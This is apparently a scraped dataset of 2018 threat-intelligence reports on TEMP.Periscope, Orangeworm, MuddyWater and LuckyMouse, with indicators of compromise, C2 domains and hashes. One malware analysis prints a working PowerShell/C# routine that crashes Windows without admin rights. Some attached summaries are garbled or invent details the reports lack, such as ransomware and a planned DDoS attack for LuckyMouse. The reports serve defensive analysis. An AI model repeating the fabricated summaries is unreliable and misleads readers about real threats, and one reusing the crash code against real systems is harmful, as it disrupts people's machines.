://www.icsswaziland[.]com//db_template.phphxxp://aiko.pro//db_template.phphxxps://alceharfield[.]com//db_template.phphxxp://indocraft[.]co.za/test/db_template.phphxxp://allegiancesecurity[.]org//db_template.phphxxp://sullivanprimary[.]co.za//db_template.phphxxp://www.apmequestrian[.]com//db_template.phphxxps://alphawaves[.]org/wp-admin/db_template.phphxxp://www.alexandrasternin[.]com/illustration/db_template.phphxxp://www.daleth[.]co.za//db_template.phphxxp://jwseshowe[.]co.za/assets/db_template.phphxxp://winagainstebola[.]com//db_template.phphxxp://anubandh[.]in//db_template.phphxxp://www.alexanderhomestead[.]com//db_template.phphxxp://alfatek-intelligence[.]com//db_template.phphxxp://www.aprendiendoencasa[.]com/wp-includes/db_template.phphxxp://alorabrownies[.]com/wp-admin/db_template.phphxxp://andrasadam[.]com/tothildiko/wp-includes/db_template.phphxxp://cazochem[.]co.za/cazochem/db_template.phphxxp://debnoch[.]com/image/db_template.phphxxp://hmholdings360[.]co.za//db_template.phphxxp://iinvest4u[.]co.za//db_template.phphxxp://burgercoetzeeattorneys[.]co.za//db_template.phphxxp://anngrigphoto[.]com//db_template.phphxxp://alchemistasonida[.]com//db_template.phphxxp://anahera[.]biz/admin/db_template.phphxxp://h-u-i[.]co.za/heiren/db_template.phphxxp://insta-art[.]co.za//db_template.phphxxp://muallematsela[.]com//db_template.phphxxp://aguasdecastilla[.]com/uploads/db_template.phphxxp://www.arabgamenetwork[.]com//db_template.phphxxps://arhiepiscopiabucurestilor[.]ro/templates/db_template.phphxxp://amruthavana[.]com/blog/db_template.phphxxp://digitalblue[.]co.za//db_template.phphxxps://www.alvarezarquitectos[.]com//db_template.phphxxp://buboobioinnovations[.]co.za/wpimages/db_template.phphxxp://andrewsbisom[.]com//db_template.phphxxp://www.m-3[.]co.za//db_template.phphxxp://beesrenovations[.]co.za/images/db_template.phphxxps://www.apliety[.]co.il/wp-includes/db_template.phphxxp://alchamelup[.]org/htdocs/db_template.phphxxp://benonicoc[.]co.za/resources/db_template.phphxxps://al-mostakbl[.]com//db_template.phphxxp://alchimiegrafiche[.]net/bbdelteatro/db_template.phphxxp://andrespazsoldan[.]com//db_template.phphxxp://in2accounting[.]co.za//db_template.phphxxp://aipa[.]ca//db_template.phphxxp://alphabee.fund/PHPMailer_5.2.0/db_template.phphxxp://arabsdeals[.]com//db_template.phphxxps://archiotronic[.]com/wp-includes/db_template.phphxxp://capewindstrading[.]co.za//db_template.phphxxps://althurayaa[.]com//db_template.phphxxp://jhphotoedits[.]co.za//db_template.phphxxp://cloudhub.co.ls/modules/db_template.phphxxp://apironco[.]com/wp-includes/db_template.phphxxp://digital-cameras-south-africa[.]co.za/script/db_template.phphxxp://ahmadhasanat[.]com//db_template.phphxxp://alexrocchi[.]com//db_template.phphxxp://aljaadi[.]com//db_template.phphxxps://www.engeltjieakademie[.]co.za//db_template.phphxxp://annabelle[.]nl/next/db_template.phphxxp://juniorad[.]co.za/vendor/db_template.phphxxp://animationpulse[.]net//db_template.phphxxp://angloglot[.]com//db_template.phphxxp://agricolavicuna.cl//db_template.phphxxp://alexelgy[.]com/allaccess/db_template.phphxxp://www.centreforgovernance[.]uk//db_template.phphxxp://www.aliandconsulting[.]com//db_template.phphxxp://balaateen[.]co.za/less/db_template.phphxxp://aleksicdunja[.]com//db_template.phphxxp://arestihome[.]com//db_template.phphxxp://am1int.fcomet[.]com/wp1/db_template.phphxxp://anet-international-group[.]com/shop/db_template.phphxxp://courtesydriving[.]co.za/js/db_template.phphxxp://annaplebanek[.]com//db_template.phphxxp://agencijazemil[.]com//db_template.phphxxp://airminumtiro[.]com//db_template.phphxxp://www.androidwikihow[.]com//db_template.phphxxp://alisabyfinna[.]com//db_template.phphxxp://rma-law[.]co.za//db_template.phphxxp://amari[.]ro/components/db_template.phphxxp://anxiousandunstoppable[.]com//db_template.phphxxp://www.buhlebayoacademy[.]com//db_template.phphxxp://arabellajo[.]com/wp/wp-includes/db_template.phphxxp://blackthorn[.]co.za//db_template.phphxxp://alaqaba[.]com/dnsarabia[.]com/db_template.phphxxp://airesis.blog/wp-admin/db_template.phphxxp://www.aptibet[.]org//db_template.phphxxp://alecattic[.]com/wp-includes/db_template.phphxxp://anglero[.]com//db_template.phphxxp://getabletravel[.]co.za/wpscripts/db_template.phphxxp://www";A campaign to target IT and information security sectors was launched from Feb. 21, 2018 to May 7, 2018, using PowerShell code obfuscation and custom code. Actors mainly targeting governments and large corporations were targeted. Implementing security policies, regularly updating security measures, and implementing file encryption can help prevent future attacks.;en;
https://www.mandiant.com/resources/blog/suspected-chinese-espionage-group-targeting-maritime-and-engineering-industries;Suspected Chinese Cyber Espionage Group (TEMP.Periscope) Targeting U.S. Engineering and Maritime Industries;"Intrusions Focus on the Engineering and Maritime SectorSince early 2018, FireEye (including our FireEye as a Service (FaaS), Mandiant Consulting, and iSIGHT Intelligence teams) has been tracking an ongoing wave of intrusions targeting engineering and maritime entities, especially those connected to South China Sea issues. The campaign is linked to a group of suspected Chinese cyber espionage actors we have tracked since 2013, dubbed TEMP.Periscope. The group has also been reported as “Leviathan” by other security firms.The current campaign is a sharp escalation of detected activity since summer 2017. Like multiple other Chinese cyber espionage actors, TEMP.Periscope has recently re-emerged and has been observed conducting operations with a revised toolkit. Known targets of this group have been involved in the maritime industry, as well as engineering-focused entities, and include research institutes, academic organizations, and private firms in the United States. FireEye products have robust detection for the malware used in this campaign.TEMP.Periscope BackgroundActive since at least 2013, TEMP.Periscope has primarily focused on maritime-related targets across multiple verticals, including engineering firms, shipping and transportation, manufacturing, defense, government offices, and research universities. However, the group has also targeted professional/consulting services, high-tech industry, healthcare, and media/publishing. Identified victims were mostly found in the United States, although organizations in Europe and at least one in Hong Kong have also been affected. TEMP.Periscope overlaps in targeting, as well as tactics, techniques, and procedures (TTPs), with TEMP.Jumper, a group that also overlaps significantly with public reporting on “NanHaiShu.”TTPs and Malware UsedIn their recent spike in activity, TEMP.Periscope has leveraged a relatively large library of malware shared with multiple other suspected Chinese groups. These tools include:AIRBREAK: a JavaScript-based backdoor also reported as “Orz” that retrieves commands from hidden strings in compromised webpages and actor controlled profiles on legitimate services.BADFLICK: a backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command and control (C2) configuration.PHOTO: a DLL backdoor also reported publicly as “Derusbi”, capable of obtaining directory, file, and drive listing; creating a reverse shell; performing screen captures; recording video and audio; listing, terminating, and creating processes; enumerating, starting, and deleting registry keys and values; logging keystrokes, returning usernames and passwords from protected storage; and renaming, deleting, copying, moving, reading, and writing to files.HOMEFRY: a 64-bit Windows password dumper/cracker that has previously been used in conjunction with AIRBREAK and BADFLICK backdoors. Some strings are obfuscated with XOR x56. The malware accepts up to two arguments at the command line: one to display cleartext credentials for each login session, and a second to display cleartext credentials, NTLM hashes, and malware version for each login session.LUNCHMONEY: an uploader that can exfiltrate files to Dropbox.MURKYTOP: a command-line reconnaissance tool. It can be used to execute files as a different user, move, and delete files locally, schedule remote AT jobs, perform host discovery on connected networks, scan for open ports on hosts in a connected network, and retrieve information about the OS, users, groups, and shares on remote hosts.China Chopper: a simple code injection webshell that executes Microsoft .NET code within HTTP POST commands. This allows the shell to upload and download files, execute applications with web server account permissions, list directory contents, access Active Directory, access databases, and any other action allowed by the .NET runtime.The following are tools that TEMP.Periscope has leveraged in past operations and could use again, though these have not been seen in the current wave of activity:Beacon: a backdoor that is commercially available as part of the Cobalt Strike software platform, commonly used for pen-testing network environments. The malware supports several capabilities, such as injecting and executing arbitrary code, uploading and downloading files, and executing shell commands.BLACKCOFFEE: a backdoor that obfuscates its communications as normal traffic to legitimate websites such as Github and Microsoft's Technet portal. Used by APT17 and other Chinese cyber espionage operators.Additional identifying TTPs include:Spear phishing, including the use of probably compromised email accounts.Lure documents using CVE-2017-11882 to drop malware.Stolen code signing certificates used to sign malware.Use of bitsadmin.exe to download additional tools.Use of PowerShell to download additional tools.Using C:\Windows\Debug and C:\Perflogs as staging directories.Leveraging Hyperhost VPS and Proton VPN exit nodes to access webshells on internet-facing systems.Using Windows Management Instrumentation (WMI) for persistence.Using Windows Shortcut files (.lnk) in the Startup folder that invoke the Windows Scripting Host (wscript.exe) to execute a Jscript backdoor for persistence.Receiving C2 instructions from user profiles created by the adversary on legitimate websites/forums such as Github and Microsoft's TechNet portal.ImplicationsThe current wave of identified intrusions is consistent with TEMP.Periscope and likely reflects a concerted effort to target sectors that may yield information that could provide an economic advantage, research and development data, intellectual property, or an edge in commercial negotiations.As we continue to investigate this activity, we may identify additional data leading to greater analytical confidence linking the operation to TEMP.Periscope or other known threat actors, as well as previously unknown campaigns.IndicatorsFile Hash Description x.js 3fefa55daeb167931975c22df3eca20a HOMEFRY, a 64-bit Windows password dumper/cracker mt.exe 40528e368d323db0ac5c3f5e1efe4889 MURKYTOP, a command-line reconnaissance tool com4.js a68bf5fce22e7f1d6f999b7a580ae477 AIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpagesHistorical Indicators";"A report on the activities of a group targeting maritime and engineering industries with a specific focus on recent targeted attacks. The report includes details on the group&#x27;s tools, tactics, and techniques, as well as indicators of compromise that can be found on systems. The report provides recommendations for organizations to implement increased monitoring, security controls, and patch and configuration updates to prevent further intrusions.";en;
http://prod-blogs-ui.client-b1.bkjdigital.com/blogs/threat-intelligence/orangeworm-targets-healthcare-us-europe-asia;New Orangeworm attack group targets the healthcare sector in the U.S., Europe, and Asia;No concern about being discoveredKwampirs uses a fairly aggressive means to propagate itself once inside a victim's network by copying itself over network shares. While this method is considered somewhat old, it may still be viable for environments that run older operating systems such as Windows XP. This method has likely proved effective within the healthcare industry, which may run legacy systems on older platforms designed for the medical community. Older systems like Windows XP are much more likely to be prevalent within this industry.Additionally, once infected, the malware cycles through a large list of command and control (C&C) servers embedded within the malware. It appears while the list is extensive, not all of the C&Cs are active and continue to beacon until a successful connection is established. Despite modifying a small part of itself while copying itself across the network as a means to evade detection, the operators have made no effort to change the C&C communication protocol since its first inception.Both of these methods are considered particularly “noisy” and may indicate that Orangeworm is not overly concerned with being discovered. The fact that little has changed with the internals of Kwampirs since its first discovery may also indicate that previous mitigation methods against the malware have been unsuccessful, and that the attackers have been able to reach their intended targets despite defenders being aware of their presence within their network.;"- Kwampirs has been in operation since at least 2015 targeting multiple industries across various countries.- The malware continues its C&amp;amp;C beacons and may still be active on older systems like Windows XP.- The malware&#x27;s C&amp;amp;Cs are not actively active, suggesting the ongoing efforts by attackers to maintain access to victims.";en;
https://sec0wn.blogspot.com/2018/05/clearing-muddywater-analysis-of-new.html;Analysis of new MuddyWater Samples;"INTRODUCTIONIt has been over 2 months since I last wrote about MuddyWater or Temp.Zagros as named by FireEye . To be honest, I felt they were going quiet for a while; but boy was I wrong. Starting this week I have picked up some new interesting samples. Although these new samples have lots of similarities with the ones from earlier in the year, there are still some interesting aspects and additional, you guessed it, obfuscation used in the new samples. Their heavy focus on layered obfuscation and preference for PowerShell is still apparent. However, I will highlight what changed based on the samples that I have analyzed.Below are screenshots of some of the recent lure documents used by this group. All Hashes are at the end of the blog.You can see from the above screenshots that their targeting seem to continue to focus on the Middle East Region (Turkey and Iraq) and Pakistan. As mentioned in my previous blogs , these lures can give us an idea of the organizations and industries that might have been targeted by this wave.The timeline of these lures based on VT submission dates seems to be from Mid Feb all the way to the most recent sample dated May 6, 2018 which I will be focusing on. The sample has the name ""mofa.gov.iq.doc"" - 94625dd8151814dd6186735a6a6a87b2a4c71c04b8402caf314fb6f98434eaad. MOFA of course stands for Ministry of Foreign Affairs.FROM MACRO TO POWERSTATS - STEP BY STEP ANALYSISI will be analyzing the sample in detail this time. I will only highlight any new/modified aspects from the obfuscation used or any additional functionality in the POWERSTATS backdoor.The document contains a Macro code with multiple Base64 encoded segments as shown belowThe first Base64 encoded variable decodes to a another chunk of encoded data as shown below. We will get back to this later onThe second Base64 encoded variable decodes to "" c:\windows\system32\rundll32.exe advpack.dll,LaunchINFSection C:\ProgramData\EventManager.logs,Defender,1, ""The third Base64 encoded variable decodes to an encoded XML file that include a obfuscated Java Script as shown belowOnce you decode the Javascript that is embedded in the XML file you will be presented with the belowThe decoded script is in fact a PowerShell script that is performing further decoding routine on a file called ""C:\\\\ProgramData\\\\WindowsDefenderService.ini"" .The content of this file is actually the encoded data from the first Base64 chunk. Once decoded, the content looks familiar as it is indeed a variant of the POWERSTATS backdoor. Lets go through a couple of the obfuscation layers used in this variant.First, decoding the data chunk will result in the following encoded PowerShell Notice the use of iex which is a variant of Invoke-Expression . In order to see the output of this, we substitute iex with Write-Output and we will be presented with the belowAlthough it looks messy, it does look familiar; The character substitution functions and the character replacements. We are getting closer. You can notice in the image above the ""&((vaRIABle '*MDR*').NAME[3,11,2]-jOiN'')"" . This in fact is Invoke-Expression just obfuscated. This means we can replace it with Write-Output as well. and the result script is something that looks like thisAgain, you can notice the use of ""( $enV:ComSpEc[4,24,25]-jOiN'')"" which is iex . Meaning we can replace it again with Write-Output .This circle of obfuscation keeps going on until we reach the decoded script which we are familiar with including the Proxy URLs and the IP identification as shown belowThis, of course is just one part of the big encoded PS script. The second and third part are the actual functionality of the Backdoor.SO WHAT IS NEW OR NOTMost of the functionality that I described in my last blog still exists with the new variants. However, there are some new additions and some modifications on the code:Screenshot function is re-written however the same purpose remains. It takes a screenshot of the victim's screen, saves it as PNG, converts it to bytes, encodes it with Base64 and then uploads it to the C&C. Inclusion of a Blue Screen of Death or BSOD code in case a certain process is found. This part of anti-debugging and anti-analysis technique The function highlighted at the bottom of the picture "" GDKZVLJXGAPYNUGCPJNPGZQPOLPPBG "" leads to a piece of code:function GDKZVLJXGAPYNUGCPJNPGZQPOLPPBG(){$s = @""using System;using System.Runtime.InteropServices;public static class C{[DllImport(""ntdll.dll"")]public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);[DllImport(""ntdll.dll"")]public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);public static unsafe void Kill(){Boolean tmp1;uint tmp2;RtlAdjustPrivilege(19, true, false, out tmp1);NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);}}""@$c = new-object -typename system.CodeDom.Compiler.CompilerParameters$c.CompilerOptions = '/unsafe'$a = Add-Type -TypeDefinition $s -Language CSharp -PassThru -CompilerParameters $c[C]::Kill()} This is an exact copy of Invoke-BSOD Barrett Adams (@peewpw) code that was created by about a month ago and is available on his GitHub page. One thing to note is that this code can BSOD a machine without the need for admin privileges as described by the author. The same function and code is also used if processes that include ""cmd.exe, PowerShell.exe or Powershell_ISE.exe"" exist on the vicitm system. There is also a function that is looking for the following strings within ProgramData folder - "" Kasper, Panda and ESET "" . If found, then the screenshot functionality and upload function will break.FINAL THOUGHTSAs with other iterations and previous write-ups about this group, they seem to have been continuing their activity and targeting different countries. In this wave they seem to have:Included an additional layer of obfuscation to the main backdoor code by using Base64 -> Obfuscated JS in XML -> Powershell character manipulations before you are presented with the encoded POWERSTATS variant. Updated section of the POWERSTATS code to include a BSOD functionality to battle Analysis and debugging. Only relies on DDEInitiate to move laterally. They seem to have ditched the other two methods from previous samples.INDICATORS OF COMPROMISEHASHES 94625dd8151814dd6186735a6a6a87b2a4c71c04b8402caf314fb6f98434eaad5c7d16bd89ef37fe02cac1851e7214a01636ee4061a80bfdbde3a2d199721a7976e9988dad0278998861717c774227bf94112db548946ef617bfaa262cb5e338707d2128a0c326626adef0d3a4cab78562abd82c2bd8ede8cc82f86c01f1e024b7b8faac19a58548b28506415f9ece479055e9af0557911ca8bbaa82b483ffb818cf5795c2208d330bd297c18445a9e25238dd7f28a1a6ef55e2a9239f5748cdPROXY LIST";The report focuses on the Middle East Region and Pakistan. It discusses how a variety of malware and obfuscation techniques are commonly used to make detection difficult. In particular, it looks at the POWERSTATS variant, which is a malware family obfuscated using a combination of PowerShell and IEX commands. The report also covers the current tactics used by attackers in the region, including the use of PowerShell commands.;en;
https://securelist.com/luckymouse-hits-national-data-center/86083/;LuckyMouse hits national data center to organize country-level waterholing campaign;What happened?In March 2018 we detected an ongoing campaign targeting a national data center in the Central Asia that we believe has been active since autumn 2017. The choice of target made this campaign especially significant – it meant the attackers gained access to a wide range of government resources at one fell swoop. We believe this access was abused, for example, by inserting malicious scripts in the country’s official websites in order to conduct watering hole attacks.The operators used the HyperBro Trojan as their last-stage in-memory remote administration tool (RAT). The timestamps for these modules are from December 2017 until January 2018. The anti-detection launcher and decompressor make extensive use of Metasploit’s shikata_ga_nai encoder as well as LZNT1 compression.Kaspersky Lab products detect the different artifacts used in this campaign with the following verdicts: Trojan.Win32.Generic, Trojan-Downloader.Win32.Upatre and Backdoor.Win32.HyperBro. A full technical report, IoCs and YARA rules are available from our intelligence reporting service (contact us intelligence@kaspersky.com).Who’s behind it?Due to tools and tactics in use we attribute the campaign to LuckyMouse Chinese-speaking actor (also known as EmissaryPanda and APT27). Also the C2 domain update.iaacstudio[.]com was previously used in their campaigns. The tools found in this campaign, such as the HyperBro Trojan, are regularly used by a variety of Chinese-speaking actors. Regarding Metasploit’s shikata_ga_nai encoder – although it’s available for everyone and couldn’t be the basis for attribution, we know this encoder has been used by LuckyMouse previously.Government entities, including the Central Asian ones also were a target for this actor before. Due to LuckyMouse’s ongoing waterholing of government websites and the corresponding dates, we suspect that one of the aims of this campaign is to access web pages via the data center and inject JavaScripts into them.How did the malware spread?The initial infection vector used in the attack against the data center is unclear. Even when we observed LuckyMouse using weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors since December 2017), we can´t prove they were related to this particular attack. It’s possible the actor used a waterhole to infect data center employees.The main C2 used in this campaign is bbs.sonypsps[.]com, which resolved to IP-address, that belongs to the Ukrainian ISP network, held by a Mikrotik router using firmware version 6.34.4 (from March 2016) with SMBv1 on board. We suspect this router was hacked as part of the campaign in order to process the malware’s HTTP requests. The Sonypsps[.]com domain was last updated using GoDaddy on 2017-05-05 until 2019-03-13.In March 2017, Wikileaks published details about an exploit affecting Mikrotik called ChimayRed. According to the documentation, however, it doesn’t work for firmware versions higher than 6.30. This router uses version 6.34.There were traces of HyperBro in the infected data center from mid-November 2017. Shortly after that different users in the country started being redirected to the malicious domain update.iaacstudio[.]com as a result of the waterholing of government websites. These events suggest that the data center infected with HyperBro and the waterholing campaign are connected.What did the malware do in the data center?The initial module drops three files that are typical for Chinese-speaking actors: a legit Symantec pcAnywhere (IntgStat.exe) for DLL side loading, a .dll launcher (pcalocalresloader.dll) and the last-stage decompressor (thumb.db). As a result of all these steps, the last-stage Trojan is injected into svchost.exe’s process memory.The launcher module, obfuscated with the notorious Metasploit’s shikata_ga_nai encoder, is the same for all the droppers. The resulting deobfuscated code performs typical side loading: it patches pcAnywhere’s image in memory at its entry point. The patched code jumps back to the decryptor’s second shikata_ga_nai iteration, but this time as part of the allowlisted application.This Metasploit’s encoder obfuscates the last part of the launcher’s code, which in turn resolves the necessary API and maps thumb.db into the same process’s (pcAnywhere) memory. The first instructions in the mapped thumb.db are for a new shikata_ga_nai iteration. The decrypted code resolves the necessary API functions, decompresses the embedded PE file with RtlCompressBuffer() using LZNT1 and maps it into memory.What does the resulting watering hole look like?The websites were compromised to redirect visitors to instances of both ScanBox and BEeF. These redirects were implemented by adding two malicious scripts obfuscated by a tool similar to the Dean Edwards packer.Users were redirected to https://google-updata[.]tk:443/hook.js, a BEeF instance, and https://windows-updata[.]tk:443/scanv1.8/i/?1, an empty ScanBox instance that answered a small piece of JavaScript code.ConclusionsLuckyMouse appears to have been very active recently. The TTPs for this campaign are quite common for Chinese-speaking actors, where they typically provide new solid wrappers (launcher and decompressor protected with shikata_ga_nai in this case) around their RATs (HyperBro).The most unusual and interesting point here is the target. A national data center is a valuable source of data that can also be abused to compromise official websites. Another interesting point is the Mikrotik router, which we believe was hacked specifically for the campaign. The reasons for this are not very clear: typically, Chinese-speaking actors don’t bother disguising their campaigns. Maybe these are the first steps in a new stealthier approach.Some indicators of compromiseDroppers22CBE2B0F1EF3F2B18B4C5AED6D7BB790D0320878946A73749111E6C94BF1525Launcherac337bd5f6f18b8fe009e45d65a2b09bHyperBro in-memory Trojan04dece2662f648f619d9c0377a7ba7c0Domains and IPsbbs.sonypsps[.]comupdate.iaacstudio[.]comwh0am1.itbaydns[.]comgoogle-updata[.]tkwindows-updata[.]tk;The report describes an ongoing campaign targeted at government websites in central Asia by a Chinese-speaking actor using Mikrotik routers. The attacker is also using other common past attack tools, including ransomware. The group is likely planning a large-scale DDoS attack. It is recommended to regularly monitor networks, update Mikrotik routers, and implement strong security measures.;en;
https://www.mandiant.com/resources/blog/chinese-espionage-group-targets-cambodia-ahead-of-elections;Chinese Espionage Group TEMP.Periscope Targets Cambodia Ahead of July 2018 Elections and Reveals Broad Operations Globally;"IntroductionFireEye has examined a range of TEMP.Periscope activity revealing extensive interest in Cambodia's politics, with active compromises of multiple Cambodian entities related to the country’s electoral system. This includes compromises of Cambodian government entities charged with overseeing the elections, as well as the targeting of opposition figures. This campaign occurs in the run up to the country’s July 29, 2018, general elections. TEMP.Periscope used the same infrastructure for a range of activity against other more traditional targets, including the defense industrial base in the United States and a chemical company based in Europe. Our previous blog post focused on the group’s targeting of engineering and maritime entities in the United States.Overall, this activity indicates that the group maintains an extensive intrusion architecture and wide array of malicious tools, and targets a large victim set, which is in line with typical Chinese-based APT efforts. We expect this activity to provide the Chinese government with widespread visibility into Cambodian elections and government operations. Additionally, this group is clearly able to run several large-scale intrusions concurrently across a wide range of victim types.Our analysis also strengthened our overall attribution of this group. We observed the toolsets we previously attributed to this group, their observed targets are in line with past group efforts and also highly similar to known Chinese APT efforts, and we identified an IP address originating in Hainan, China that was used to remotely access and administer a command and control (C2) server.TEMP.Periscope BackgroundActive since at least 2013, TEMP.Periscope has primarily focused on maritime-related targets across multiple verticals, including engineering firms, shipping and transportation, manufacturing, defense, government offices, and research universities (targeting is summarized in Figure 1). The group has also targeted professional/consulting services, high-tech industry, healthcare, and media/publishing. TEMP.Periscope overlaps in targeting, as well as tactics, techniques, and procedures (TTPs), with TEMP.Jumper, a group that also overlaps significantly with public reporting by Proofpoint and F-Secure on ""NanHaiShu.""Figure 1: Summary of TEMP.Periscope activityIncident BackgroundFireEye analyzed files on three open indexes believed to be controlled by TEMP.Periscope, which yielded insight into the group's objectives, operational tactics, and a significant amount of technical attribution/validation. These files were ""open indexed"" and thus accessible to anyone on the public internet. This TEMP.Periscope activity on these servers extends from at least April 2017 to the present, with the most current operations focusing on Cambodia's government and elections.Two servers, chemscalere[.]com and scsnewstoday[.]com, operate as typical C2 servers and hosting sites, while the third, mlcdailynews[.]com, functions as an active SCANBOX server. The C2 servers contained both logs and malware.Analysis of logs from the three servers revealed: Potential actor logins from an IP address located in Hainan, China that was used to remotely access and administer the servers, and interact with malware deployed at victim organizations. Malware command and control check-ins from victim organizations in the education, aviation, chemical, defense, government, maritime, and technology sectors across multiple regions. FireEye has notified all of the victims that we were able to identify.The malware present on the servers included both new families (DADBOD, EVILTECH) and previously identified malware families (AIRBREAK, EVILTECH, HOMEFRY, MURKYTOP, HTRAN, and SCANBOX) .Compromises of Cambodian Election EntitiesAnalysis of command and control logs on the servers revealed compromises of multiple Cambodian entities, primarily those relating to the upcoming July 2018 elections. In addition, a separate spear phishing email analyzed by FireEye indicates concurrent targeting of opposition figures within Cambodia by TEMP.Periscope.Analysis indicated that the following Cambodian government organizations and individuals were compromised by TEMP.Periscope:National Election Commission, Ministry of the Interior, Ministry of Foreign Affairs and International Cooperation, Cambodian Senate, Ministry of Economics and FinanceMember of Parliament representing Cambodia National Rescue PartyMultiple Cambodians advocating human rights and democracy who have written critically of the current ruling partyTwo Cambodian diplomats serving overseasMultiple Cambodian media entitiesTEMP.Periscope sent a spear phish with AIRBREAK malware to Monovithya Kem, Deputy Director-General, Public Affairs, Cambodia National Rescue Party (CNRP), and the daughter of (imprisoned) Cambodian opposition party leader Kem Sokha (Figure 2). The decoy document purports to come from LICADHO (a non-governmental organization [NGO] in Cambodia established in 1992 to promote human rights). This sample leveraged scsnewstoday[.]com for C2.Figure 2: Human right protection survey lureThe decoy document ""Interview Questions.docx"" (MD5: ba1e5b539c3ae21c756c48a8b5281b7e) is tied to AIRBREAK downloaders of the same name. The questions reference the opposition Cambodian National Rescue Party, human rights, and the election (Figure 3).Figure 3: Interview questions decoyInfrastructure Also Used for Operations Against Private CompaniesThe aforementioned malicious infrastructure was also used against private companies in Asia, Europe and North America. These companies are in a wide range of industries, including academics, aviation, chemical, maritime, and technology. A MURKYTOP sample from 2017 and data contained in a file linked to chemscalere[.]com suggest that a corporation involved in the U.S. defense industrial base (DIB) industry, possibly related to maritime research, was compromised. Many of these compromises are in line with TEMP.Periscope’s previous activity targeting maritime and defense industries. However, we also uncovered the compromise of a European chemical company with a presence in Asia, demonstrating that this group is a threat to business worldwide, particularly those with ties to Asia.AIRBREAK Downloaders and Droppers Reveal Lure IndicatorsFilenames for AIRBREAK downloaders found on the open indexed sites also suggest the ongoing targeting of interests associated with Asian geopolitics. In addition, analysis of AIRBREAK downloader sites revealed a related server that underscores TEMP.Periscope's interest in Cambodian politics.The AIRBREAK downloaders in Table 1 redirect intended victims to the indicated sites to display a legitimate decoy document while downloading an AIRBREAK payload from one of the identified C2s. Of note, the hosting site for the legitimate documents was not compromised. An additional C2 domain, partyforumseasia[.]com, was identified as the callback for an AIRBREAK downloader referencing the Cambodian National Rescue Party.Redirect Site (Not Malicious) AIRBREAK Downloader AIRBREAK C2 en.freshnewsasia.com/index.php/en/8623-2018-04-26-10-12-46.html TOP_NEWS_Japan_to_Support_the_Election.js (3c51c89078139337c2c92e084bb0904c) [Figure 4] chemscalere[.]com iric.gov.kh/LICADHO/Interview-Questions.pdf [pdf]Interview-Questions.pdf.js (e413b45a04bf5f812912772f4a14650f) iric.gov.kh/LICADHO/Interview-Questions.pdf [docx]Interview-Questions.docx.js (cf027a4829c9364d40dcab3f14c1f6b7) unknown Interview_Questions.docx.js (c8fdd2b2ddec970fa69272fdf5ee86cc) scsnewstoday[.]com atimes.com/article/philippines-draws-three-hard-new-lines-on-china/ Philippines-draws-three-hard-new-lines-on-china .js (5d6ad552f1d1b5cfe99ddb0e2bb51fd7) mlcdailynews[.]com facebook.com/CNR.Movement/videos/190313618267633/ CNR.Movement.mp4.js (217d40ccd91160c152e5fce0143b16ef) Partyforumseasia[.]comTable 1: AIRBREAK downloadersFigure 4: Decoy document associated with AIRBREAK downloader file TOP_NEWS_Japan_to_Support_the_Election.jsSCANBOX Activity Gives Hints to Future OperationsThe active SCANBOX server, mlcdailynews[.]com, is hosting articles related to the current Cambodian campaign and broader operations. Articles found on the server indicate targeting of those with interests in U.S.-East Asia geopolitics, Russia and NATO affairs. Victims are likely either brought to the SCANBOX server via strategic website compromise or malicious links in targeted emails with the article presented as decoy material. The articles come from open-source reporting readily available online. Figure 5 is a SCANBOX welcome page and Table 2 is a list of the articles found on the server.Figure 5: SCANBOX welcome pageCopied Article Topic Article Source (Not Compromised) Leaders confident yet nervous Khmer Times Mahathir_ 'We want to be friendly with China PM urges voters to support CPP for peace CPP determined to maintain Kingdom's peace and development Bun Chhay's wife dies at 60 Crackdown planned on boycott callers Further floods coming to Kingdom Kem Sokha again denied bail PM vows to stay on as premier to quash traitors Iran_ Don't trust Trump Fresh News Kim-Trump summit_ Singapore's role Trump's North Korea summit may bring peace declaration - but at a cost Reuters U.S. pushes NATO to ready more forces to deter Russian threat us-nato-russia_us-pushes-nato-to-ready-more-forces-to-deter-russian-threat Interior Minister Sar Kheng warns of dirty tricks Phnom Penh Post Another player to enter market for cashless pay Donald Trump says he has 'absolute right' to pardon himself but he's done nothing wrong - Donald Trump's America ABC News China-funded national road inaugurated in Cambodia The Cambodia Daily Kim and Trump in first summit session in Singapore Asia Times U.S. to suspend military exercises with South Korea, Trump says U.S. News Rainsy defamed the King_ Hun Sen BREAKING NEWS cambodia-opposition-leader-denied-bail-again-in-treason-case Associated PressTable 2: SCANBOX articles copied to serverTEMP.Periscope Malware SuiteAnalysis of the malware inventory contained on the three servers found a classic suite of TEMP.Periscope payloads, including the signature AIRBREAK, MURKYTOP, and HOMEFRY. In addition, FireEye’s analysis identified new tools, EVILTECH and DADBOD (Table 3).Malware Function Details EVILTECH Backdoor EVILTECH is a JavaScript sample that implements a simple RAT with support for uploading, downloading, and running arbitrary JavaScript.During the infection process, EVILTECH is run on the system, which then causes a redirect and possibly the download of additional malware or connection to another attacker-controlled system. DADBOD Credential Theft DADBOD is a tool used to steal user cookies.Analysis of this malware is still ongoing.Table 3: New additions to the TEMP.Periscope malware suiteData from Logs Strengthens Attribution to ChinaOur analysis of the servers and surrounding data in this latest campaign bolsters our previous assessment that TEMP.Periscope is likely Chinese in origin. Data from a control panel access log indicates that operators are based in China and are operating on computers with Chinese language settings.A log on the server revealed IP addresses that had been used to log in to the software used to communicate with malware on victim machines. One of the IP addresses, 112.66.188.28, is located in Hainan, China. Other addresses belong to virtual private servers, but artifacts indicate that the computers used to log in all cases are configured with Chinese language settings.Outlook and ImplicationsThe activity uncovered here offers new insight into TEMP.Periscope’s activity. We were previously aware of this actor’s interest in maritime affairs, but this compromise gives additional indications that it will target the political system of strategically important countries. Notably, Cambodia has served as a reliable supporter of China’s South China Sea position in international forums such as ASEAN and is an important partner. While Cambodia is rated as Authoritarian by the Economist’s Democracy Index, the recent surprise upset of the ruling party in Malaysia may motivate China to closely monitor Cambodia’s July 29 elections.The targeting of the election commission is particularly significant, given the critical role it plays in facilitating voting. There is not yet enough information to determine why the organization was compromised – simply gathering intelligence or as part of a more complex operation. Regardless, this incident 